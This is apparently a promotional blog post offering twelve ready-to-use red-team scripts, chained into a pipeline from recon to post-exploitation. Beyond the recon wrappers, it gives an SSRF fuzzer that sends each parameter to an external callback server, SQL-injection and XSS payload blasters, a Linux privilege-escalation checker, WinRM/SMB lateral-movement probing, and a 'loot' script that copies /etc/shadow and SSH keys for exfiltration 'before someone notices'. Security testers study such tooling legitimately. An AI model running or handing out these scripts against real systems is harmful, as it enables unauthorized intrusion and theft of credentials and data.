# Red Team Automation: 12 Scripts That Save Hours (and Win Real Engagements)

**Published:** 2026-04-03


Ever burned a whole weekend on manual recon, only to realize you missed a low-hanging RCE vector because you were sorting through logs by hand? You’re not alone. Over 60% of red teamers admit they waste precious hours on tasks a good script could finish before you even pour your coffee. Let’s fix that — together.

Welcome to the world of red team automation. I’m about to walk you through 12 real-life scripts that I (and countless pentesters) use to speed up recon, exploitation, and post-exploitation — leaving more time for creative attacks and, honestly, more sleep.

![Image](https://miro.medium.com/v2/resize:fit:700/0*c2Ms_hsIsQnGwi31)

*Photo by Nahel Hadi on Unsplash*

### Why Red Team Automation Matters (More Than Ever)

Red teaming is more competitive than ever. Bug bounty programs drop new assets weekly. Clients want deeper coverage in less time. If you’re still clicking through Burp Suite by hand, you’re probably missing out — on both findings **and fun.**

Here’s the thing: the best red teamers aren’t just manual testers; they’re power-users of automation. They build, tweak, and deploy scripts for everything from OSINT to privilege escalation, making themselves practically unstoppable.

### What You’ll Get Today

*   12 actionable scripts (with code you can use or adapt)
*   Step-by-step usage for each—no guesswork
*   Tips to integrate into your workflow, whether you’re a lone wolf or leading a team

Sound good? Let’s roll.

### Automated Subdomain Enumeration with Subfinder & Amass

If you’re still running `nslookup` in a loop — stop. Subdomain enumeration is foundation work, and automation here saves hours.

### Script: Bash Wrapper for Subdomain Recon

This little beauty chains Subfinder and Amass for you, merges results, and sorts out duplicates. Run it, walk away, come back to a fat list of targets.

#!/bin/bash  
  
domain=$1  
  
if \[ -z "$domain" \]; then  
  echo "Usage: $0 <domain>"  
  exit 1  
fi  
  
subfinder -d $domain -silent > subs1.txt  
amass enum -d $domain -o subs2.txt  
  
cat subs1.txt subs2.txt | sort -u > ${domain}\_all\_subs.txt  
rm subs1.txt subs2.txt  
  
echo "\[\*\] Subdomain enumeration complete. Results in ${domain}\_all\_subs.txt"

### How to Use

*   Save as `subenum.sh`, `chmod +x subenum.sh`
*   Run `./subenum.sh example.com`
*   Drink your coffee while it runs

### Why It’s Gold

*   Kicks off two industry-standard tools at once
*   Dedupes every result
*   Scales to hundreds of domains if looped

### 2\. Mass Port Scanning with Fast-Scan Nmap

Manual Nmap scans are slow, especially on wide scopes. You need something snappy for initial sweeps.

### Script: Quick Nmap Top 1000 Port Scanner

Here’s a bash snippet that blitzes through your subdomain list.


input=$1  
  
if \[ -z "$input" \]; then  
  echo "Usage: $0 <subdomains\_file>"  
  exit 1  
fi  
  
while read host; do  
  echo "Scanning $host..."  
  nmap -T4 -F -Pn $host | tee -a nmap\_results.txt  
done < $input  
  
echo "Done! All results in nmap\_results.txt"

### Hints

*   `-T4` speeds up scans
*   `-F` checks top 100 ports (customize as needed)
*   `-Pn` skips host discovery if ICMP is blocked

### Real-World Use

I’ve handed off 200+ targets to this script during a live engagement — let it run overnight, then dig into the open ports with targeted scripts next morning.

### 3\. Automated Screenshotting with Aquatone

Ever spent hours checking which subdomains are visually interesting? You don’t have to.

### Script: Aquatone Screenshot Collector


subs=$1  
  
if \[ -z "$subs" \]; then  
  echo "Usage: $0 <subdomains\_file>"  
  exit 1  
fi  
  
cat $subs | aquatone -out aquatone\_report  
  
echo "\[\*\] Aquatone complete. Open aquatone\_report/aquatone\_report.html to browse screenshots."

### Why This Rocks

*   Visual triage: spot juicy apps (admin panels, test portals) at a glance
*   Great for reporting—drop screenshots right into your findings

### Pro Tip

Combine this output with your Nmap results for targeted web attacks.

### 4\. One-Liner for HTTP Probing: httprobe

You’ve got 1000 subdomains, but which ones actually respond over HTTP/HTTPS? Don’t check by hand.

### Script: Check HTTP/HTTPS Live Hosts

cat ${domain}\_all\_subs.txt | httprobe > live\_hosts.txt

### What’s Happening

*   Feeds your big list of subs to `httprobe`
*   Dumps only live web hosts to `live_hosts.txt`

### Use Case

Perfect before mass vulnerability scanning or XSS poking.

### 5\. Mass Vulnerability Scanning with Nuclei

Let’s be honest — manual CVE checks are for masochists. `nuclei` automates thousands of vulnerability checks.

### Script: Nuclei Mass Scanner

nuclei -l live\_hosts.txt -t cves/ -o nuclei\_results.txt

### Key Points

*   `-l` points to your list of live hosts
*   `-t cves/` grabs all CVE templates (update as needed)
*   Output is nice and clean for grep or manual review

### Real-World Impact

I’ve seen zero-days pop up here — especially on large external pentests where you’re fishing for low-effort, high-impact bugs.

### 6\. Automated Directory Bruteforcing with Gobuster

Directory brute-forcing by hand? Not in this decade.

### Script: Gobuster Loop Over Live Hosts


hosts=$1  
  
if \[ -z "$hosts" \]; then  
  echo "Usage: $0 <live\_hosts\_file>"  
  exit 1  
fi  
  
wordlist="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"  
  
while read url; do  
  echo "Scanning $url..."  
  gobuster dir -u $url -w $wordlist -q -o gobuster\_${url//\[:\\/\]/\_}.txt  
done < $hosts  
  
echo "Done. Check gobuster\_\* files for results."

### What’s Different Here

*   Handles weird domain/URL characters in filenames
*   Runs quietly (\`-q\`)
*   Easily parallelizable for big scopes

### 7\. Automated SSRF Tester

SSRF (Server-Side Request Forgery) is a goldmine but a pain to test at scale. Let’s automate payload injection.

### Script: SSRF Fuzzer for URL Parameters


target=$1  
  
if \[ -z "$target" \]; then  
  echo "Usage: $0 <url>"  
  exit 1  
fi  
  
attacker\_server="http://your.burpcollaborator.net"  
  
params=$(echo $target | grep -oP '(?<=\\?).\*' | tr '&' '\\n' | cut -d= -f1)  
  
for param in $params; do  
  test\_url=$(echo $target | sed "s/\\($param\=\\)\[^&\]\*/\\1$attacker\_server/")  
  echo "Testing $param: $test\_url"  
  curl -sk $test\_url &  
done  
  
wait  
echo "Check your Burp Collaborator or logging server for hits."


*   Replace `your.burpcollaborator.net` with your external listener
*   Script injects your callback into every query parameter
*   Check your logs for SSRF triggers

### The Cool Part?

This tactic scales — tweak for wordlists or larger target sets with minimal effort.

### 8\. SQL Injection Fuzzer: Quickfire

SQLi is still rampant, but fuzzing every param by hand is tedious.

### Script: Rapid SQLi Param Tester


target=$1  
  
if \[ -z "$target" \]; then  
  echo "Usage: $0 <url\_with\_params>"  
  exit 1  
fi  
  
payload="' OR '1'='1"  
  
params=$(echo $target | grep -oP '(?<=\\?).\*' | tr '&' '\\n' | cut -d= -f1)  
  
for param in $params; do  
  test\_url=$(echo $target | sed "s/\\($param\=\\)\[^&\]\*/\\1$payload/")  
  echo "Testing parameter $param"  
  curl -sk $test\_url | grep -i error && echo "\[!\] Possible SQLi on $param"  
done

### What It Does

*   Rewrites each parameter with a classic payload
*   Flags possible errors for quick triage

### In Practice…

You’ll still want to validate manually — but this script surfaces the “weird” ones for deeper investigation.

### 9\. XSS Payload Automator

Cross-site scripting is everywhere, but who wants to copy-paste payloads for each parameter?

### Script: XSS Param Blaster


target=$1  
  
if \[ -z "$target" \]; then  
  echo "Usage: $0 <url\_with\_params>"  
  exit 1  
fi  
  
payload="<script>alert('XSS')</script>"  
  
params=$(echo $target | grep -oP '(?<=\\?).\*' | tr '&' '\\n' | cut -d= -f1)  
  
for param in $params; do  
  test\_url=$(echo $target | sed "s/\\($param\=\\)\[^&\]\*/\\1$payload/")  
  echo "Testing $param for XSS"  
  curl -sk $test\_url | grep "$payload" && echo "\[\*\] XSS reflected on $param"  
done


*   Works great for GET parameters
*   Fires classic payload, checks if reflected

### Want More?

Pair with Burp Repeater for deeper, manual tests — or expand your payload arsenal for tricky filters.

### 10\. Mass Privilege Escalation Checker (Linux)

You’ve got a shell. You want root. It’s not always obvious what to try — unless you automate the boring checks.

### Script: Linux PrivEsc Fast Checker


echo "\[\*\] Checking for sudo privileges..."  
sudo -l  
  
echo "\[\*\] Checking for writable /etc/passwd or /etc/shadow..."  
ls -l /etc/passwd /etc/shadow  
  
echo "\[\*\] Looking for SUID binaries..."  
find / -perm -4000 -type f 2>/dev/null  
  
echo "\[\*\] Searching for world-writable files..."  
find / -writable -type f 2>/dev/null  
  
echo "\[\*\] Scanning for password files..."  
find / -name '\*.bak' -or -name '\*.old' -or -name '\*.swp' 2>/dev/null  
  
echo "\[\*\] Done. Review outputs for privilege escalation vectors."

### Why It Helps

*   One-off all the classic privesc checks in seconds
*   Helps surface misconfigurations or forgotten SUID binaries

### In Practice

I’ve landed root access just by spotting a world-writable SUID file. This script makes sure you don’t miss those easy wins.

### 11\. Lateral Movement Finder (Windows)

Once inside a network, you want to move laterally — quickly. Mapping trust relationships by hand is slow.

### Script: WinRM/SMB Lateral Movement Scanner (PowerShell)

$hosts = Get-Content .\\hosts.txt  
foreach ($host in $hosts) {  
    Write-Output "Checking $host..."  
    Test-WSMan $host -ErrorAction SilentlyContinue && Write-Output "$host has WinRM exposed."  
    Test-NetConnection -ComputerName $host -Port 445 | Where-Object { $\_.TcpTestSucceeded } | ForEach-Object { Write-Output "$host has SMB open." }  
}

### How It Works

*   Reads a list of hosts (from bloodhound, nmap, whatever)
*   Checks for WinRM (PowerShell Remoting) and SMB (classic lateral movement vectors)

### Real Talk

You’ll need the right creds to exploit these, but knowing where the doors are saves tons of time.

### 12\. Exfiltration Script: Quick Data Grabber

Once you pop a box, you want sensitive data — fast, before someone notices.

### Script: Fast /etc and SSH Data Collector (Linux)


loot\_dir="loot\_$(hostname)\_$(date +%s)"  
mkdir $loot\_dir  
  
cp /etc/passwd $loot\_dir/  
cp /etc/shadow $loot\_dir/ 2>/dev/null  
cp -R ~/.ssh $loot\_dir/ 2>/dev/null  
  
tar czvf ${loot\_dir}.tar.gz $loot\_dir  
  
echo "\[\*\] Data exfil complete. Grab ${loot\_dir}.tar.gz"

### What It Snags

*   Password hashes
*   SSH keys (user context)
*   Compresses everything for fast transfer


*   Run after privilege escalation — or as your first step post-shell
*   Transfer the archive, analyze offline

### Bonus: Chaining it All Together

Here’s where it gets interesting. You can chain these scripts into a full red team pipeline. Imagine:

1.  Subdomain enum feeds live host detection
2.  Live hosts go into Nmap, Aquatone, and Nuclei
3.  Vulnerable hosts get Gobuster, SSRF, SQLi, and XSS fuzzers
4.  Inside, privesc and exfil scripts make sure you don’t leave loot behind

It’s not just about running tools — it’s about combining them so you focus on the creative part of hacking, not the grind.

### Bringing It All Home

Red team automation isn’t just a nice-to-have. It’s your secret weapon against time, boredom, and missed findings.

Scripts like these don’t make you less of a hacker — they set you free to hunt for the clever bugs, the privilege escalation chains, and the rare misconfigs that make a report shine.

If you’re serious about pentesting, bug bounty, or internal red team ops, start automating these boring (but essential) tasks today. Build your own library, share with teammates, and iterate.

And hey, if you’ve got a killer script of your own that saved your skin, let’s trade stories. The best red teams never stop learning — or automating.

Keep hacking smarter.

### 🚀 Become a VeryLazyTech Member — Get Instant Access

What you get today:

✅ **70GB Google Drive** packed with cybersecurity content

✅ **3 full courses** to level up fast

👉 **Join the Membership** → [https://shop.verylazytech.com](https://shop.verylazytech.com)

### 📚 Need Specific Resources?

✅ Instantly download the **best hacking guides, OSCP prep kits, cheat sheets, and scripts** used by real security pros.

👉 **Visit the Shop** → [https://shop.verylazytech.com](https://shop.verylazytech.com)

### 💬 Stay in the Loop

Want quick tips, free tools, and sneak peeks?

✖ [https://x.com/verylazytech/](https://x.com/verylazytech/)

| 👾 [https://github.com/verylazytech/](https://github.com/verylazytech/)

| 📺 [https://youtube.com/@verylazytech/](https://youtube.com/@verylazytech/)

| 📩 [https://t.me/+mSGyb008VL40MmVk/](https://t.me/+mSGyb008VL40MmVk/)

| 🕵️‍♂️ [https://www.verylazytech.com/](https://www.verylazytech.com/)